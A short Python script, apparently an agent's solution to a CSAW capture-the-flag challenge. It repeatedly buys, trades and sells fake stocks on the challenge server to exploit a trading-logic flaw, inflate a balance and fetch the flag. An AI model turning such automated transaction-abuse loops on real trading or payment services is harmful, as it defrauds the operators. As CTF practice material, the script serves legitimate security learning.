import requests
import time
import uuid

BASE = "http://android-dropper.csaw.io:4657"
KEY = "farm_" + uuid.uuid4().hex[:8]
s = requests.Session()

def post(path, data):
    r = s.post(BASE + path, data=data, timeout=5)
    print(path, data, "=>", r.text, flush=True)
    return r.text

print("KEY", KEY, flush=True)
post("/login", {"key": KEY})
post("/buy", {"key": KEY, "stock": "GOOBER"})
time.sleep(2)

for i in range(60):
    post("/trade", {"key": KEY, "stock": "GOOBER", "stock1": "BURPSHARKHAT"})
    time.sleep(2)
    post("/sell", {"key": KEY, "stock": "BURPSHARKHAT"})
    time.sleep(1)
    state = post("/login", {"key": KEY})
    if "900" in state or "1000" in state or "11000" in state:
        flag = post("/flag", {"key": KEY})
        print(flag, flush=True)
        break
end_of_edit
